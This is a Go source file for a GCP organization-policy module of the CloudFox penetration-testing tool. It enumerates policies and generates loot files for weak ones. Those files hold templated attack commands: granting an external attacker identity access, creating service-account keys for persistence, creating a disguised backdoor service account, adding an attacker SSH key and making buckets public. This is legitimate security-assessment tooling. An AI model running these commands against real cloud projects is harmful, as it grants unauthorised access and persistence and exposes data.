package commands

import (
	"github.com/BishopFox/cloudfox/gcp/shared"
	"context"
	"fmt"
	"strings"
	"sync"

	orgpolicyservice "github.com/BishopFox/cloudfox/gcp/services/orgpolicyService"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	gcpinternal "github.com/BishopFox/cloudfox/internal/gcp"
	"github.com/spf13/cobra"
)

var GCPOrgPoliciesCommand = &cobra.Command{
	Use:     globals.GCP_ORGPOLICIES_MODULE_NAME,
	Aliases: []string{"orgpolicy", "policies"},
	Short:   "Enumerate organization policies and identify security weaknesses",
	Long: `Enumerate GCP organization policies to identify security configuration weaknesses.

Organization policies control security constraints across GCP resources. This module
identifies policies that may be misconfigured or weakened, creating security risks.

Security-Relevant Policies Analyzed:
- Domain restrictions (iam.allowedPolicyMemberDomains)
- Service account key controls (iam.disableServiceAccountKeyCreation)
- Workload identity restrictions
- Compute security (Shielded VM, OS Login, external IPs)
- Storage security (public access, uniform access)
- SQL security (public IPs, authorized networks)
- GKE security (public endpoints)
- Resource location restrictions

Risk Indicators:
- AllowAll: Policy allows any value (HIGH risk)
- Wildcard patterns: Overly permissive allowed values
- Unenforced: Security constraint not enabled
- Override: Project overrides parent restrictions`,
	Run: runGCPOrgPoliciesCommand,
}

type OrgPoliciesModule struct {
	gcpinternal.BaseGCPModule
	ProjectPolicies map[string][]orgpolicyservice.OrgPolicyInfo // projectID -> policies
	LootMap         map[string]map[string]*internal.LootFile    // projectID -> loot files
	mu              sync.Mutex
}

type OrgPoliciesOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o OrgPoliciesOutput) TableFiles() []internal.TableFile { return o.Table }
func (o OrgPoliciesOutput) LootFiles() []internal.LootFile   { return o.Loot }

func runGCPOrgPoliciesCommand(cmd *cobra.Command, args []string) {
	cmdCtx, err := gcpinternal.InitializeCommandContext(cmd, globals.GCP_ORGPOLICIES_MODULE_NAME)
	if err != nil {
		return
	}

	module := &OrgPoliciesModule{
		BaseGCPModule:   gcpinternal.NewBaseGCPModule(cmdCtx),
		ProjectPolicies: make(map[string][]orgpolicyservice.OrgPolicyInfo),
		LootMap:         make(map[string]map[string]*internal.LootFile),
	}
	module.Execute(cmdCtx.Ctx, cmdCtx.Logger)
}

func (m *OrgPoliciesModule) Execute(ctx context.Context, logger internal.Logger) {
	m.RunProjectEnumeration(ctx, logger, m.ProjectIDs, globals.GCP_ORGPOLICIES_MODULE_NAME, m.processProject)

	allPolicies := m.getAllPolicies()
	if len(allPolicies) == 0 {
		logger.InfoM("No organization policies found (may require orgpolicy.policies.list permission)", globals.GCP_ORGPOLICIES_MODULE_NAME)
		return
	}

	logger.SuccessM(fmt.Sprintf("Found %d organization policy(ies)", len(allPolicies)), globals.GCP_ORGPOLICIES_MODULE_NAME)
	m.writeOutput(ctx, logger)
}

func (m *OrgPoliciesModule) getAllPolicies() []orgpolicyservice.OrgPolicyInfo {
	var all []orgpolicyservice.OrgPolicyInfo
	for _, policies := range m.ProjectPolicies {
		all = append(all, policies...)
	}
	return all
}

func (m *OrgPoliciesModule) processProject(ctx context.Context, projectID string, logger internal.Logger) {
	if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
		logger.InfoM(fmt.Sprintf("Enumerating org policies in project: %s", projectID), globals.GCP_ORGPOLICIES_MODULE_NAME)
	}

	m.mu.Lock()
	if m.LootMap[projectID] == nil {
		m.LootMap[projectID] = make(map[string]*internal.LootFile)
		m.LootMap[projectID]["orgpolicies-commands"] = &internal.LootFile{
			Name:     "orgpolicies-commands",
			Contents: "# Organization Policy Commands\n# Generated by CloudFox\n# WARNING: Only use with proper authorization\n\n",
		}
	}
	m.mu.Unlock()

	svc := orgpolicyservice.New()
	policies, err := svc.ListProjectPolicies(projectID)
	if err != nil {
		m.CommandCounter.Error++
		gcpinternal.HandleGCPError(err, logger, globals.GCP_ORGPOLICIES_MODULE_NAME,
			fmt.Sprintf("Could not enumerate org policies in project %s", projectID))
		return
	}

	m.mu.Lock()
	m.ProjectPolicies[projectID] = policies
	for _, policy := range policies {
		m.addPolicyToLoot(projectID, policy)
	}
	m.mu.Unlock()
}

func (m *OrgPoliciesModule) addPolicyToLoot(projectID string, policy orgpolicyservice.OrgPolicyInfo) {
	lootFile := m.LootMap[projectID]["orgpolicies-commands"]
	if lootFile == nil {
		return
	}
	// Extract short constraint name for commands
	constraintName := policy.Constraint
	if strings.HasPrefix(constraintName, "constraints/") {
		constraintName = strings.TrimPrefix(constraintName, "constraints/")
	}

	lootFile.Contents += fmt.Sprintf(
		"# =============================================================================\n"+
			"# CONSTRAINT: %s\n"+
			"# =============================================================================\n"+
			"# Project: %s\n",
		policy.Constraint,
		policy.ProjectID,
	)

	if policy.Description != "" {
		lootFile.Contents += fmt.Sprintf("# Description: %s\n", policy.Description)
	}

	lootFile.Contents += fmt.Sprintf(
		"# Enforced: %s, AllowAll: %s, DenyAll: %s, Inherit: %s\n",
		shared.BoolToYesNo(policy.Enforced),
		shared.BoolToYesNo(policy.AllowAll),
		shared.BoolToYesNo(policy.DenyAll),
		shared.BoolToYesNo(policy.InheritParent),
	)

	if len(policy.AllowedValues) > 0 {
		lootFile.Contents += fmt.Sprintf("# Allowed Values: %s\n", strings.Join(policy.AllowedValues, ", "))
	}
	if len(policy.DeniedValues) > 0 {
		lootFile.Contents += fmt.Sprintf("# Denied Values: %s\n", strings.Join(policy.DeniedValues, ", "))
	}

	lootFile.Contents += fmt.Sprintf(
		"\n# === ENUMERATION COMMANDS ===\n\n"+
			"# Describe this policy:\n"+
			"gcloud org-policies describe %s --project=%s\n\n"+
			"# Get effective policy (includes inheritance):\n"+
			"gcloud org-policies describe %s --project=%s --effective\n\n"+
			"# List all constraints for this project:\n"+
			"gcloud org-policies list --project=%s\n\n",
		constraintName, policy.ProjectID,
		constraintName, policy.ProjectID,
		policy.ProjectID,
	)

	// Exploit/bypass commands based on specific constraint types
	lootFile.Contents += "# === EXPLOIT / BYPASS COMMANDS ===\n\n"

	switch constraintName {
	case "iam.allowedPolicyMemberDomains":
		if policy.AllowAll {
			lootFile.Contents += "# [FINDING] Domain restriction is DISABLED (AllowAll) - any external identity can be granted access\n"
			lootFile.Contents += fmt.Sprintf(
				"# Grant access to external identity:\n"+
					"gcloud projects add-iam-policy-binding %s --member=user:attacker@external.com --role=roles/viewer\n\n",
				policy.ProjectID,
			)
		} else if !policy.Enforced {
			lootFile.Contents += "# [FINDING] Domain restriction is NOT ENFORCED\n\n"
		}

	case "iam.disableServiceAccountKeyCreation":
		if !policy.Enforced || policy.AllowAll {
			lootFile.Contents += "# [FINDING] SA key creation is NOT restricted - create keys for persistence:\n"
			lootFile.Contents += fmt.Sprintf(
				"gcloud iam service-accounts keys create /tmp/sa-key.json --iam-account=SA_EMAIL@%s.iam.gserviceaccount.com\n\n",
				policy.ProjectID,
			)
		} else {
			lootFile.Contents += "# SA key creation is restricted - try alternative persistence methods:\n" +
				"# - Workload identity federation\n" +
				"# - Service account impersonation chain\n\n"
		}

	case "iam.disableServiceAccountCreation":
		if !policy.Enforced || policy.AllowAll {
			lootFile.Contents += "# [FINDING] SA creation is NOT restricted - create backdoor service accounts:\n"
			lootFile.Contents += fmt.Sprintf(
				"gcloud iam service-accounts create cloudfox-backdoor --display-name='System Service' --project=%s\n\n",
				policy.ProjectID,
			)
		}

	case "compute.requireShieldedVm":
		if !policy.Enforced || policy.AllowAll {
			lootFile.Contents += "# [FINDING] Shielded VM is NOT required - unshielded VMs can be created:\n" +
				"# Boot integrity monitoring is not enforced\n\n"
		}

	case "compute.requireOsLogin":
		if !policy.Enforced || policy.AllowAll {
			lootFile.Contents += "# [FINDING] OS Login is NOT required - SSH keys can be added to project/instance metadata:\n"
			lootFile.Contents += fmt.Sprintf(
				"# Add SSH key to project metadata:\n"+
					"gcloud compute project-info add-metadata --metadata=ssh-keys=\"attacker:ssh-rsa AAAA...\" --project=%s\n\n",
				policy.ProjectID,
			)
		}

	case "compute.vmExternalIpAccess":
		if policy.AllowAll {
			lootFile.Contents += "# [FINDING] External IP access is NOT restricted - VMs can have public IPs:\n" +
				"# Any VM can be assigned a public IP for data exfiltration\n\n"
		}

	case "storage.uniformBucketLevelAccess":
		if !policy.Enforced || policy.AllowAll {
			lootFile.Contents += "# [FINDING] Uniform bucket access is NOT enforced - ACLs can be used:\n" +
				"# Fine-grained ACLs allow per-object permissions that are harder to audit\n\n"
		}

	case "storage.publicAccessPrevention":
		if !policy.Enforced || policy.AllowAll {
			lootFile.Contents += "# [FINDING] Public access prevention is NOT enforced:\n"
			lootFile.Contents += fmt.Sprintf(
				"# Make a bucket publicly accessible:\n"+
					"gsutil iam ch allUsers:objectViewer gs://BUCKET_NAME\n"+
					"# Or set public ACL:\n"+
					"gsutil acl ch -u AllUsers:R gs://BUCKET_NAME/OBJECT\n\n",
			)
		}

	case "sql.restrictPublicIp":
		if !policy.Enforced || policy.AllowAll {
			lootFile.Contents += "# [FINDING] Public IP restriction is NOT enforced on Cloud SQL:\n" +
				"# SQL instances can be created with public IPs\n\n"
		}

	case "sql.restrictAuthorizedNetworks":
		if !policy.Enforced || policy.AllowAll {
			lootFile.Contents += "# [FINDING] Authorized network restriction is NOT enforced:\n" +
				"# 0.0.0.0/0 can be added to authorized networks\n\n"
		}

	default:
		if policy.AllowAll {
			lootFile.Contents += fmt.Sprintf("# [FINDING] Policy %s has AllowAll - constraint is effectively disabled\n\n", constraintName)
		} else if !policy.Enforced {
			lootFile.Contents += fmt.Sprintf("# [FINDING] Policy %s is not enforced\n\n", constraintName)
		}
	}
}

func (m *OrgPoliciesModule) writeOutput(ctx context.Context, logger internal.Logger) {
	if m.Hierarchy != nil && !m.FlatOutput {
		m.writeHierarchicalOutput(ctx, logger)
	} else {
		m.writeFlatOutput(ctx, logger)
	}
}

func (m *OrgPoliciesModule) getHeader() []string {
	return []string{
		"Project Name",
		"Project ID",
		"Constraint",
		"Description",
		"Enforced",
		"Allow All",
		"Deny All",
		"Inherit",
		"Allowed Values",
		"Denied Values",
	}
}

func (m *OrgPoliciesModule) policiesToTableBody(policies []orgpolicyservice.OrgPolicyInfo) [][]string {
	var body [][]string
	for _, policy := range policies {
		description := policy.Description
		if description == "" {
			description = "-"
		}

		allowedValues := "-"
		if len(policy.AllowedValues) > 0 {
			allowedValues = strings.Join(policy.AllowedValues, ", ")
		}

		deniedValues := "-"
		if len(policy.DeniedValues) > 0 {
			deniedValues = strings.Join(policy.DeniedValues, ", ")
		}

		body = append(body, []string{
			m.GetProjectName(policy.ProjectID),
			policy.ProjectID,
			policy.Constraint,
			description,
			shared.BoolToYesNo(policy.Enforced),
			shared.BoolToYesNo(policy.AllowAll),
			shared.BoolToYesNo(policy.DenyAll),
			shared.BoolToYesNo(policy.InheritParent),
			allowedValues,
			deniedValues,
		})
	}
	return body
}

func (m *OrgPoliciesModule) buildTablesForProject(projectID string) []internal.TableFile {
	var tableFiles []internal.TableFile
	if policies, ok := m.ProjectPolicies[projectID]; ok && len(policies) > 0 {
		tableFiles = append(tableFiles, internal.TableFile{
			Name:   "orgpolicies",
			Header: m.getHeader(),
			Body:   m.policiesToTableBody(policies),
		})
	}
	return tableFiles
}

func (m *OrgPoliciesModule) writeHierarchicalOutput(ctx context.Context, logger internal.Logger) {
	outputData := internal.HierarchicalOutputData{
		OrgLevelData:     make(map[string]internal.CloudfoxOutput),
		ProjectLevelData: make(map[string]internal.CloudfoxOutput),
	}

	for projectID := range m.ProjectPolicies {
		tableFiles := m.buildTablesForProject(projectID)

		var lootFiles []internal.LootFile
		if projectLoot, ok := m.LootMap[projectID]; ok {
			for _, loot := range projectLoot {
				if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# WARNING: Only use with proper authorization\n\n") {
					lootFiles = append(lootFiles, *loot)
				}
			}
		}

		outputData.ProjectLevelData[projectID] = OrgPoliciesOutput{Table: tableFiles, Loot: lootFiles}
	}

	pathBuilder := m.BuildPathBuilder()

	err := internal.HandleHierarchicalOutputSmart("gcp", m.Format, m.Verbosity, m.WrapTable, pathBuilder, outputData)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing hierarchical output: %v", err), globals.GCP_ORGPOLICIES_MODULE_NAME)
	}
}

func (m *OrgPoliciesModule) writeFlatOutput(ctx context.Context, logger internal.Logger) {
	allPolicies := m.getAllPolicies()

	var tables []internal.TableFile
	if len(allPolicies) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "orgpolicies",
			Header: m.getHeader(),
			Body:   m.policiesToTableBody(allPolicies),
		})
	}

	var lootFiles []internal.LootFile
	for _, projectLoot := range m.LootMap {
		for _, loot := range projectLoot {
			if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# WARNING: Only use with proper authorization\n\n") {
				lootFiles = append(lootFiles, *loot)
			}
		}
	}

	output := OrgPoliciesOutput{Table: tables, Loot: lootFiles}

	scopeNames := make([]string, len(m.ProjectIDs))
	for i, id := range m.ProjectIDs {
		scopeNames[i] = m.GetProjectName(id)
	}

	err := internal.HandleOutputSmart(
		"gcp",
		m.Format,
		m.OutputDirectory,
		m.Verbosity,
		m.WrapTable,
		"project",
		m.ProjectIDs,
		scopeNames,
		m.Account,
		output,
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), globals.GCP_ORGPOLICIES_MODULE_NAME)
	}
}
